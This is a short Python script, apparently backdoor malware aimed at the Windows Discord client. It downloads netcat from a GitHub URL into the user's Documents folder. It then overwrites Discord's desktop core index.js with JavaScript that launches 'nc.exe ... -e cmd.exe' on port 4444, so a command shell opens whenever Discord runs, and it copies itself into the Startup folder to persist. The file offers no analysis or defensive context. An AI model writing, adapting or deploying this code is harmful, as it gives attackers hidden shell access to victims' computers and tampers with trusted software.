import os
import requests
import shutil

user = str(os.environ["USERNAME"])
basename = str(os.path.basename(__file__))

payload = """const { exec } = require("child_process");
exec("C:\\\\Users\\\\""" + user + """\\\\Documents\\\\nc.exe -vv 127.0.0.1 4444 -e cmd.exe", (error, stdout, stderr) => {
if (error) {
        console.log(`error: ${error.message}`);
        return;
}
if (stderr) {
    console.log(`stderr: ${stderr}`);
    return;
}
console.log(`stdout: ${stdout}`);
});
module.exports = require('./core.asar');
"""

def backdoor(filename):
    r = requests.get("http://github.com/diegocr/netcat/raw/master/nc.exe", allow_redirects=True)
    with open("C:\\Users\\" + user + "\\Documents\\nc.exe", "wb")as f3:
        f3.write(r.content)
    with open(filename, 'r') as f2:
        content = f2.read()
        if content == payload:
            exit()
        else:
            f2.close()
    with open(filename, 'w')as f:
        f.write(payload)

def persistance():
    shutil.copy(__file__, "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    exit()

def main():
    path = "C:\\Users\\" + user + "\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_desktop_core\\index.js"
    backdoor(path)
    persistance()

main()
